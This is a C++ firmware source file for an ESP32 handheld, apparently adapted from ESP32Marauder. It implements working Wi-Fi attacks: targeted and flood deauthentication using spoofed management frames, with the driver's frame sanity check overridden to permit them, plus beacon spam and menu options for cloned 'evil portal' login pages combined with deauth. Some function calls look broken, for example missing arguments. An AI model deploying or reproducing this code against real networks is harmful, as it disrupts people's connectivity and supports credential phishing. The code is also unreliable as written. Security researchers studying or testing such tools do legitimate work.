// Borrowed from https://github.com/justcallmekoko/ESP32Marauder/
// Learned from https://github.com/risinek/esp32-wifi-penetration-tool/
// Arduino IDE needs to be tweeked to work, follow the instructions:
// https://github.com/justcallmekoko/ESP32Marauder/wiki/arduino-ide-setup But change the file in:
// C:\Users\<YOur User>\AppData\Local\Arduino15\packages\m5stack\hardware\esp32\2.0.9
#include "wifi_atks.h"
#include "core/display.h"
#include "core/main_menu.h"
#include "core/mykeyboard.h"
#include "core/utils.h"
#include "core/wifi/wifi_common.h"
#include "esp_system.h"
#include "esp_wifi.h"
#include "evil_portal.h"
#include "vector"
#include <Arduino.h>
#include <globals.h>

std::vector<wifi_ap_record_t> ap_records;
/**
 * @brief Decomplied function that overrides original one at compilation time.
 *
 * @attention This function is not meant to be called!
 * @see Project with original idea/implementation https://github.com/GANESH-ICMC/esp32-deauther
 */
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    if (arg == 31337) return 1;
    else return 0;
}

uint8_t deauth_frame[sizeof(deauth_frame_default)]; // 26 = [sizeof(deauth_frame_default[])]

wifi_ap_record_t ap_record;

/***************************************************************************************
** Function: send_raw_frame
** @brief: Broadcasts deauth frames
***************************************************************************************/
void send_raw_frame(const uint8_t *frame_buffer, int size) {
    esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
    vTaskDelay(1 / portTICK_RATE_MS);
    esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
    vTaskDelay(1 / portTICK_RATE_MS);
    esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
    vTaskDelay(1 / portTICK_RATE_MS);
}

/***************************************************************************************
** function: wsl_bypasser_send_raw_frame
** @brief: prepare the frame to deploy the attack
***************************************************************************************/
void wsl_bypasser_send_raw_frame(const wifi_ap_record_t *ap_record, uint8_t chan, const uint8_t target[6]) {
    Serial.begin(115200);
    Serial.print("\nPreparing deauth frame to AP -> ");
    for (int j = 0; j < 6; j++) {
        Serial.print(ap_record->bssid[j], HEX);
        if (j < 5) Serial.print(":");
    }
    Serial.print(" and Tgt: ");
    for (int j = 0; j < 6; j++) {
        Serial.print(target[j], HEX);
        if (j < 5) Serial.print(":");
    }

    esp_err_t err;
    err = esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) Serial.println("Error changing channel");
    vTaskDelay(50 / portTICK_RATE_MS);
    memcpy(&deauth_frame[4], target, 6); // Client MAC Address for Station Deauth
    memcpy(&deauth_frame[10], ap_record->bssid, 6);
    memcpy(&deauth_frame[16], ap_record->bssid, 6);
}

/***************************************************************************************
** function: wifi_atk_info
** @brief: Open Wifi information screen
***************************************************************************************/
void wifi_atk_info(String tssid, String mac, uint8_t channel) {
    // desenhar a tela
    drawMainBorder();
    tft.setTextColor(bruceConfig.priColor);
    tft.drawCentreString("-=Information=-", tft.width() / 2, 28, SMOOTH_FONT);
    tft.drawString("AP: " + tssid, 10, 48);
    tft.drawString("Channel: " + String(channel), 10, 66);
    tft.drawString(mac, 10, 84);
    tft.drawString("Press " + String(BTN_ALIAS) + " to act", 10, tftHeight - 20);
    vTaskDelay(200 / portTICK_RATE_MS);
    SelPress = false;

    while (1) {
        if (check(SelPress)) {
            returnToMenu = false;
            return;
        }
        if (check(EscPress)) {
            returnToMenu = true;
            return;
        }
        vTaskDelay(50 / portTICK_RATE_MS);
    }
}

/***************************************************************************************
** function: target_atk_menu
** @brief: Open menu to choose which AP Attack
***************************************************************************************/
void wifi_atk_menu() {
    bool scanAtks = false;
    options = {
        {"Target Atks",  [&]() { scanAtks = true; }    },
        {"Beacon SPAM",  [=]() { beaconAttack(); }     },
        {"Deauth Flood", [=]() { deauthFloodAttack(); }},
    };
    addOptionToMainMenu();
    loopOptions(options);
    if (scanAtks) {
        int nets;
        WiFi.mode(WIFI_MODE_STA);
        displayTextLine("Scanning..");
        nets = WiFi.scanNetworks();
        ap_records.clear();
        options = {};
        for (int i = 0; i < nets; i++) {
            wifi_ap_record_t record;
            memcpy(record.bssid, WiFi.BSSID(i), 6);
            record.primary = static_cast<uint8_t>(WiFi.channel(i));
            ap_records.push_back(record);

            String ssid = WiFi.SSID(i);
            int encryptionType = WiFi.encryptionType(i);
            int32_t rssi = WiFi.RSSI(i);
            int32_t ch = WiFi.channel(i);
            String encryptionPrefix = (encryptionType == WIFI_AUTH_OPEN) ? "" : "#";
            String encryptionTypeStr;
            switch (encryptionType) {
                case WIFI_AUTH_OPEN: encryptionTypeStr = "Open"; break;
                case WIFI_AUTH_WEP: encryptionTypeStr = "WEP"; break;
                case WIFI_AUTH_WPA_PSK: encryptionTypeStr = "WPA/PSK"; break;
                case WIFI_AUTH_WPA2_PSK: encryptionTypeStr = "WPA2/PSK"; break;
                case WIFI_AUTH_WPA_WPA2_PSK: encryptionTypeStr = "WPA/WPA2/PSK"; break;
                case WIFI_AUTH_WPA2_ENTERPRISE: encryptionTypeStr = "WPA2/Enterprise"; break;
                default: encryptionTypeStr = "Unknown"; break;
            }
            String optionText = encryptionPrefix + ssid + " (" + String(rssi) + "|" + encryptionTypeStr +
                                "|ch." + String(ch) + ")";

            options.push_back({optionText.c_str(), [=]() {
                                   ap_record = ap_records[i];
                                   target_atk_menu(
                                       WiFi.SSID(i).c_str(),
                                       WiFi.BSSIDstr(i),
                                       static_cast<uint8_t>(WiFi.channel(i))
                                   );
                               }});
        }

        addOptionToMainMenu();

        loopOptions(options);
        options.clear();
    }
}
void deauthFloodAttack() {
    Serial.begin(115200);
    WiFi.mode(WIFI_AP);
    if (!WiFi.softAP("DeauthFlood", emptyString, 1, 1, 4, false)) {
        displayError("Failed to start AP", true);
        return;
    }
    wifiConnected = true;
    int nets;
    WiFi.mode(WIFI_AP);
ScanNets:
    displayTextLine("Scanning..");
    nets = WiFi.scanNetworks();
    ap_records.clear();
    for (int i = 0; i < nets; i++) {
        wifi_ap_record_t record;
        memcpy(record.bssid, WiFi.BSSID(i), 6);
        record.primary = WiFi.channel(i);
        ap_records.push_back(record);
    }
    // Prepare deauth frame for each AP record
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));

    uint32_t lastTime = millis();
    uint32_t rescan_counter = millis();
    uint16_t count = 0;
    uint8_t channel = 0;
    drawMainBorderWithTitle("Deauth Flood");
    while (true) {
        for (const auto &record : ap_records) {
            channel = record.primary;
            wsl_bypasser_send_raw_frame(&record, record.primary); // Sets channel to the same AP
            tft.setCursor(10, tftHeight - 45);
            tft.println("Channel " + String(record.primary) + "    ");
            for (int i = 0; i < 100; i++) {
                send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
                count += 3;
                if (EscPress) break;
            }
            if (EscPress) break;
        }
        // Update counter every 2 seconds
        if (millis() - lastTime > 2000) {
            drawMainBorderWithTitle("Deauth Flood");
            tft.setCursor(10, tftHeight - 25);
            tft.print("Frames:               ");
            tft.setCursor(10, tftHeight - 25);
            tft.println("Frames: " + String(count / 2) + "/s   ");
            tft.setCursor(10, tftHeight - 45);
            tft.println("Channel " + String(channel) + "    ");
            count = 0;
            lastTime = millis();
        }
        if (millis() - rescan_counter > 60000) goto ScanNets; // re-scan networks for more relability

        if (check(EscPress)) break;
    }

    wifiDisconnect();
    returnToMenu = true;
}

/***************************************************************************************
** function: target_atk_menu
** @brief: Open menu to choose which AP Attack
***************************************************************************************/
void target_atk_menu(String tssid, String mac, uint8_t channel) {
AGAIN:
    options = {
        {"Information",         [=]() { wifi_atk_info(tssid, mac, channel); }      },
        {"Deauth",              [=]() { target_atk(tssid, mac, channel); }         },
        {"Clone Portal",        [=]() { EvilPortal(tssid, channel, false, false); }},
        {"Deauth+Clone",        [=]() { EvilPortal(tssid, channel, true, false); } },
        {"Deauth+Clone+Verify",
         [=]() // New WiFi Attack
         { EvilPortal(tssid, channel, true, true); }                               },
    };
    addOptionToMainMenu();

    loopOptions(options);
    if (!returnToMenu) goto AGAIN; // get back from Information without overflow the stack
}

/***************************************************************************************
** function: target_atk
** @brief: Deploy Target deauth
***************************************************************************************/
void target_atk(String tssid, String mac, uint8_t channel) {
    Serial.begin(115200);

    WiFi.mode(WIFI_AP);
    if (!WiFi.softAP(tssid, emptyString, channel, 1, 4, false)) {
        while (!check(SelPress)) { yield(); }
    }
    wifiConnected = true;
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    wsl_bypasser_send_raw_frame(&ap_record, channel);

    // loop com o ataque mostrando o numero de frames por segundo
    uint32_t tmp = 0;
    uint16_t count = 0;
    tmp = millis();
    bool redraw = true;
    check(SelPress);

    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.setTextSize(FM);
    setCpuFrequencyMhz(240);
    while (1) {
        if (redraw) {
            // desenhar a tela
            drawMainBorderWithTitle("Target Deauth");
            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            padprintln("");
            padprintln("AP: " + tssid);
            padprintln("Channel: " + String(channel));
            padprintln(mac);
            vTaskDelay(50 / portTICK_RATE_MS);
            redraw = false;
        }
        // Send frame
        send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
        count += 3; // the function above sends 3 frames each time
        // atualize counter
        if (millis() - tmp > 2000) {
            tft.setCursor(15, tftHeight - 23);
            tft.print("Frames: " + String(count / 2) + "/s");
            count = 0;
            tmp = millis();
        }
        // Pause attack
        if (check(SelPress)) {
            displayTextLine("Deauth Paused");
            // wait to restart or kick out of the function
            while (!check(SelPress)) {
                if (check(EscPress)) break;
            }
            redraw = true;
        }
        // Checks para sair do while
        if (check(EscPress)) break;
    }
    wifiDisconnect();
    returnToMenu = true;
}

void generateRandomWiFiMac(uint8_t *mac) {
    for (int i = 1; i < 6; i++) { mac[i] = random(0, 255); }
}

char randomName[32];
char *randomSSID() {
    const char *charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    int len = rand() % 22 + 7; // Generate a random length between 1 and 10
    for (int i = 0; i < len; ++i) {
        randomName[i] = charset[rand() % strlen(charset)]; // S elect random characters from the charset
    }
    randomName[len] = '\0'; // Null-terminate the string
    return randomName;
}

char emptySSID[32];
const char Beacons[] PROGMEM = {"Mom Use This One\n"
                                "Abraham Linksys\n"
                                "Benjamin FrankLAN\n"
                                "Martin Router King\n"
                                "John Wilkes Bluetooth\n"
                                "Pretty Fly for a Wi-Fi\n"
                                "Bill Wi the Science Fi\n"
                                "I Believe Wi Can Fi\n"
                                "Tell My Wi-Fi Love Her\n"
                                "No More Mister Wi-Fi\n"
                                "LAN Solo\n"
                                "The LAN Before Time\n"
                                "Silence of the LANs\n"
                                "House LANister\n"
                                "Winternet Is Coming\n"
                                "Ping's Landing\n"
                                "The Ping in the North\n"
                                "This LAN Is My LAN\n"
                                "Get Off My LAN\n"
                                "The Promised LAN\n"
                                "The LAN Down Under\n"
                                "FBI Surveillance Van 4\n"
                                "Area 51 Test Site\n"
                                "Drive-By Wi-Fi\n"
                                "Planet Express\n"
                                "Wu Tang LAN\n"
                                "Darude LANstorm\n"
                                "Never Gonna Give You Up\n"
                                "Hide Yo Kids, Hide Yo Wi-Fi\n"
                                "Loading…\n"
                                "Searching…\n"
                                "VIRUS.EXE\n"
                                "Virus-Infected Wi-Fi\n"
                                "Starbucks Wi-Fi\n"
                                "Text 64ALL for Password\n"
                                "Yell BRUCE for Password\n"
                                "The Password Is 1234\n"
                                "Free Public Wi-Fi\n"
                                "No Free Wi-Fi Here\n"
                                "Get Your Own Damn Wi-Fi\n"
                                "It Hurts When IP\n"
                                "Dora the Internet Explorer\n"
                                "404 Wi-Fi Unavailable\n"
                                "Porque-Fi\n"
                                "Titanic Syncing\n"
                                "Test Wi-Fi Please Ignore\n"
                                "Drop It Like It's Hotspot\n"
                                "Life in the Fast LAN\n"
                                "The Creep Next Door\n"
                                "Ye Olde Internet\n"};

const char rickrollssids[] PROGMEM = {"01 Never gonna give you up\n"
                                      "02 Never gonna let you down\n"
                                      "03 Never gonna run around\n"
                                      "04 and desert you\n"
                                      "05 Never gonna make you cry\n"
                                      "06 Never gonna say goodbye\n"
                                      "07 Never gonna tell a lie\n"
                                      "08 and hurt you\n"};

const uint8_t packet[128] = {
    0x80,
    0x00,
    0x00,
    0x00, // Frame Control, Duration
    /*4*/ 0xff,
    0xff,
    0xff,
    0xff,
    0xff,
    0xff, // Destination address
    /*10*/ 0x01,
    0x02,
    0x03,
    0x04,
    0x05,
    0x06, // Source address - overwritten later
    /*16*/ 0x01,
    0x02,
    0x03,
    0x04,
    0x05,
    0x06, // BSSID - overwritten to the same as the source address
    /*22*/ 0xc0,
    0x6c, // Seq-ctl
    /*24*/ 0x83,
    0x51,
    0xf7,
    0x8f,
    0x0f,
    0x00,
    0x00,
    0x00, // timestamp - the number of microseconds the AP has been active
    /*32*/ 0x64,
    0x00, // Beacon interval
    /*34*/ 0x01,
    0x04, // Capability info
          /* SSID */
    /*36*/ 0x00
};

// goes to next channel
const uint8_t channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11}; // used Wi-Fi channels (available: 1-14)
uint8_t channelIndex = 0;
uint8_t wifi_channel = 1;

void nextChannel() {
    if (sizeof(channels) > 1) {
        uint8_t ch = channels[channelIndex];
        channelIndex++;
        if (channelIndex > sizeof(channels)) channelIndex = 0;

        if (ch != wifi_channel && ch >= 1 && ch <= 14) {
            wifi_channel = ch;
            // wifi_set_channel(wifi_channel);
            esp_wifi_set_channel(wifi_channel, WIFI_SECOND_CHAN_NONE);
        }
    }
}
void beaconSpamList(const char list[]) {
    // beacon frame definition
    uint8_t beaconPacket[109] = {/*  0 - 3  */ 0x80,
                                 0x00,
                                 0x00,
                                 0x00, // Type/Subtype: managment beacon frame
                                 /*  4 - 9  */ 0xFF,
                                 0xFF,
                                 0xFF,
                                 0xFF,
                                 0xFF,
                                 0xFF, // Destination: broadcast
                                 /* 10 - 15 */ 0x01,
                                 0x02,
                                 0x03,
                                 0x04,
                                 0x05,
                                 0x06, // Source
                                 /* 16 - 21 */ 0x01,
                                 0x02,
                                 0x03,
                                 0x04,
                                 0x05,
                                 0x06, // Source

                                 // Fixed parameters
                                 /* 22 - 23 */ 0x00,
                                 0x00, // Fragment & sequence number (will be done by the SDK)
                                 /* 24 - 31 */ 0x83,
                                 0x51,
                                 0xf7,
                                 0x8f,
                                 0x0f,
                                 0x00,
                                 0x00,
                                 0x00, // Timestamp
                                 /* 32 - 33 */ 0xe8,
                                 0x03, // Interval: 0x64, 0x00 => every 100ms - 0xe8, 0x03 => every 1s
                                 /* 34 - 35 */ 0x31,
                                 0x00, // capabilities Tnformation

                                 // Tagged parameters

                                 // SSID parameters
                                 /* 36 - 37 */ 0x00,
                                 0x20, // Tag: Set SSID length, Tag length: 32
                                 /* 38 - 69 */ 0x20,
                                 0x20,
                                 0x20,
                                 0x20,
                                 0x20,
                                 0x20,
                                 0x20,
                                 0x20,
                                 0x20,
                                 0x20,
                                 0x20,
                                 0x20,
                                 0x20,
                                 0x20,
                                 0x20,
                                 0x20,
                                 0x20,
                                 0x20,
                                 0x20,
                                 0x20,
                                 0x20,
                                 0x20,
                                 0x20,
                                 0x20,
                                 0x20,
                                 0x20,
                                 0x20,
                                 0x20,
                                 0x20,
                                 0x20,
                                 0x20,
                                 0x20, // SSID

                                 // Supported Rates
                                 /* 70 - 71 */ 0x01,
                                 0x08,          // Tag: Supported Rates, Tag length: 8
                                 /* 72 */ 0x82, // 1(B)
                                 /* 73 */ 0x84, // 2(B)
                                 /* 74 */ 0x8b, // 5.5(B)
                                 /* 75 */ 0x96, // 11(B)
                                 /* 76 */ 0x24, // 18
                                 /* 77 */ 0x30, // 24
                                 /* 78 */ 0x48, // 36
                                 /* 79 */ 0x6c, // 54

                                 // Current Channel
                                 /* 80 - 81 */ 0x03,
                                 0x01,          // Channel set, length
                                 /* 82 */ 0x01, // Current Channel

                                 // RSN information
                                 /*  83 -  84 */ 0x30,
                                 0x18,
                                 /*  85 -  86 */ 0x01,
                                 0x00,
                                 /*  87 -  90 */ 0x00,
                                 0x0f,
                                 0xac,
                                 0x02,
                                 /*  91 -  92 */ 0x02,
                                 0x00,
                                 /*  93 - 100 */ 0x00,
                                 0x0f,
                                 0xac,
                                 0x04,
                                 0x00,
                                 0x0f,
                                 0xac,
                                 0x04, /*Fix: changed 0x02(TKIP) to 0x04(CCMP) is default. WPA2 with TKIP not
                                          supported by many devices*/
                                 /* 101 - 102 */ 0x01,
                                 0x00,
                                 /* 103 - 106 */ 0x00,
                                 0x0f,
                                 0xac,
                                 0x02,
                                 /* 107 - 108 */ 0x00,
                                 0x00};

    // temp variables
    int i = 0;
    int j = 0;
    char tmp;
    uint8_t macAddr[6];
    int ssidsLen = strlen_P(list);

    // go to next channel
    nextChannel();

    while (i < ssidsLen) {
        // read out next SSID
        // read out next SSID
        j = 0;
        do {
            tmp = pgm_read_byte(list + i + j);
            j++;
        } while (tmp != '\n' && j <= 32 && i + j < ssidsLen);

        uint8_t ssidLen = j - 1;

        // set MAC address
        generateRandomWiFiMac(macAddr);

        // write MAC address into beacon frame
        memcpy(&beaconPacket[10], macAddr, 6);
        memcpy(&beaconPacket[16], macAddr, 6);

        // reset SSID
        memcpy(&beaconPacket[38], emptySSID, 32);

        // write new SSID into beacon frame
        memcpy_P(&beaconPacket[38], &list[i], ssidLen);
        // set channel for beacon frame
        beaconPacket[82] = wifi_channel;
        beaconPacket[34] = 0x31; // wpa

        // send packet
        for (int k = 0; k < 3; k++) {
            esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, sizeof(beaconPacket), 0);
            vTaskDelay(1 / portTICK_RATE_MS);
        }
        i += j;
        if (EscPress) break; // Check the variable without changing it
    }
}

void beaconAttack() {
    // change WiFi mode
    WiFi.mode(WIFI_MODE_STA);
    int BeaconMode;
    String txt = "";
    // create empty SSID
    for (int i = 0; i < 32; i++) emptySSID[i] = ' ';
    // for random generator
    randomSeed(1);
    options = {
        {"Funny SSID",
         [&]() {
             BeaconMode = 0;
             txt = "Spamming Funny";
         }                        },
        {"Ricky Roll",
         [&]() {
             BeaconMode = 1;
             txt = "Spamming Ricky";
         }                        },
        {"Random SSID",
         [&]() {
             BeaconMode = 2;
             txt = "Spamming Random";
         }                        },
        {"Custom SSIDs", [&]() {
             BeaconMode = 3;
             txt = "Spamming Custom";
         }},
    };
    addOptionToMainMenu();
    loopOptions(options);

    wifiConnected = true; // display wifi icon
    String beaconFile = "";
    File file;
    FS *fs;
    if (BeaconMode != 3) {
        drawMainBorderWithTitle("WiFi: Beacon SPAM");
        displayTextLine(txt);
    }

    while (1) {
        if (BeaconMode == 0) {
            beaconSpamList(Beacons);
        } else if (BeaconMode == 1) {
            beaconSpamList(rickrollssids);
        } else if (BeaconMode == 2) {
            char *randoms = randomSSID();
            beaconSpamList(randoms);
        } else if (BeaconMode == 3) {
            if (!file) {
                options = {};

                fs = nullptr;
                if (setupSdCard()) {
                    options.push_back({"SD Card", [&]() { fs = &SD; }});
                }
                options.push_back({"LittleFS", [&]() { fs = &LittleFS; }});
                addOptionToMainMenu();

                loopOptions(options);
                if (fs != nullptr) beaconFile = loopSD(*fs, true, "TXT");
                else goto END;
                file = fs->open(beaconFile, FILE_READ);
                beaconFile = file.readString();
                beaconFile.replace("\r\n", "\n");
                tft.drawPixel(0, 0, 0);
                drawMainBorderWithTitle("WiFi: Beacon SPAM");
                displayTextLine(txt);
            }

            const char *randoms = beaconFile.c_str();
            beaconSpamList(randoms);
        }
        if (check(EscPress) || returnToMenu) {
            if (BeaconMode == 3) file.close();
            break;
        }
    }
END:
    wifiDisconnect();
}
